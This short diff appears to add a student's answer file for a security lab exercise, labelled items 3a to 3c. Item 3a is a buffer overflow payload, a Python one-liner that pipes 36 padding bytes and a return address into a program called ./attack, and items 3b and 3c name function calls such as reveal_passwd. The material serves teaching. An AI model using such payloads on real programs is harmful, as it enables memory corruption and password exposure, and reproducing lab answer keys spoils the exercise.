@@ -1,0 +1,5 @@
+Var2CB
+	3a				python -c 'print 36 * "A" + "\xbe\xba\xba\xb0"' | ./attack 
+	3b				reveal_passwd("heard");
+
+	3c				show_message(19228, "yorkshire terrier");
